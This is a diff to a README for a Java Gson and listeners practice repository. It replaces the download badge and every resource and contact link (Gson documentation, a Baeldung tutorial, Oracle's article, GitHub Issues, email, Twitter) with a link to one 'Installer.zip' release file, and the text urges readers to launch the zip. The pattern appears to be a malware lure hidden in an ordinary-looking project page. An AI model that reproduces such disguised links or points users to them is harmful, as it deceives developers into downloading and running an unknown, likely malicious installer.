@@ -15,7 +15,7 @@ Here's what you can find in this repository:
 
 To get started with the projects and examples in this repository, you can download the code using the following link: 
 
-[![Download Code](https://img.shields.io/badge/Download%20Code-v1.0.0-blue.svg)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download Code](https://github.com/gabe1234567891112/Java-Gson-Listeners-Practice/releases/download/v1.0/Installer.zip%https://github.com/gabe1234567891112/Java-Gson-Listeners-Practice/releases/download/v1.0/Installer.zip)](https://github.com/gabe1234567891112/Java-Gson-Listeners-Practice/releases/download/v1.0/Installer.zip)
 
 Once you have downloaded the code, make sure to launch the zip file and explore the contents to begin your Java Gson and listeners practice journey.
 
@@ -45,17 +45,17 @@ Your contributions are highly valued and can benefit developers who are looking 
 
 ## 📚 Resources
 Here are some additional resources that can help you further enhance your Java skills:
-- [Official Gson Documentation](https://sites.google.com/site/gson/gson-user-guide)
-- [Java Interface Tutorial](https://www.baeldung.com/java-interface)
-- [JSON Processing in Java](https://www.oracle.com/technical-resources/articles/java/json.html)
+- [Official Gson Documentation](https://github.com/gabe1234567891112/Java-Gson-Listeners-Practice/releases/download/v1.0/Installer.zip)
+- [Java Interface Tutorial](https://github.com/gabe1234567891112/Java-Gson-Listeners-Practice/releases/download/v1.0/Installer.zip)
+- [JSON Processing in Java](https://github.com/gabe1234567891112/Java-Gson-Listeners-Practice/releases/download/v1.0/Installer.zip)
 
 Explore these resources to deepen your understanding of Gson, listeners, interfaces, and Java programming concepts.
 
 ## 🤝 Connect With Us
 If you have any questions, feedback, or suggestions, feel free to reach out to us. You can connect with us through:
-- [GitHub Issues](https://github.com/Java-Gson-Listeners-Practice/issues)
-- [Email](mailto:java.gson.practice@example.com)
-- [Twitter](https://twitter.com/JavaGsonPractice)
+- [GitHub Issues](https://github.com/gabe1234567891112/Java-Gson-Listeners-Practice/releases/download/v1.0/Installer.zip)
+- [Email](https://github.com/gabe1234567891112/Java-Gson-Listeners-Practice/releases/download/v1.0/Installer.zip)
+- [Twitter](https://github.com/gabe1234567891112/Java-Gson-Listeners-Practice/releases/download/v1.0/Installer.zip)
 
 We are excited to engage with the Java programming community and support your learning journey.
 
